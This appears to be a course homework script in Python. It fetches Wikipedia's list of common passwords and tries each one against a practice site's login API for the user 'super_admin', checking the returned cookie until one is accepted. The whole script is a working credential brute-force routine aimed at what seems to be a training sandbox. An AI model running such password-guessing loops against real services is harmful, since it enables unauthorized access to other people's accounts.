import requests
import pandas

tables = pandas.read_html("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
table = tables[2]
stop = False
for col in table.columns:
    if col != "Rank":
        for val in table[col]:
            payload = {"login": "super_admin", "password": val}
            response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                      data=payload)
            cookies = response1.cookies
            response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                      cookies=cookies)
            if response2.text != "You are NOT authorized":
                print(response2.text)
                print(val)
                break
        else:
            continue
        break

